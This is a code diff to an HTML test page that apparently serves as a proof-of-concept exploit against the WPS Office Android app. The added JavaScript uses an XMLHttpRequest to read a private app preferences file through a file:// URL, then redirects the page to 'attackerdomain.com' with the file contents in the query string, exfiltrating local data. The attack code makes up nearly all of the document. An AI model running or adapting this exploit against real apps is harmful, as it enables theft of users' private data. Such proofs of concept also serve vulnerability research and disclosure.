@@ -164,7 +164,7 @@ startTask
 
     <input id="TEST" type="test" width="500px">
     <button onclick="runInput()">RunInput</button>
-    <button onclick="XHRTEST()">XHR TEST2</button>
+    <button onclick="XHRTEST()">XHR TEST3</button>
     <p id="myP">
 
     </p>
@@ -174,10 +174,19 @@ startTask
 
     <script type="text/javascript">
         function XHRTEST() {
+
             var xhr = new XMLHttpRequest();
-            xhr.open("get", "file:///data/data/cn.wps.moffice_eng/shared_prefs/public_default.xml", false);
-            xhr.send();
-            document.getElementById("myP").innerHTML += xhr.responseText;
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState == XMLHttpRequest.DONE) {
+                    document.getElementById("myP").innerHTML += "GOT IT";
+                    document.getElementById("myP").innerHTML += xhr.responseText;
+                    window.location.replace('https://attackerdomain.com/?exfiltrated=' + xhr.responseText);
+                }
+            }
+            xhr.open('GET', 'file:///data/data/cn.wps.moffice_eng/shared_prefs/public_default.xml', true);
+            xhr.send(null);
+
+
 
         };
 
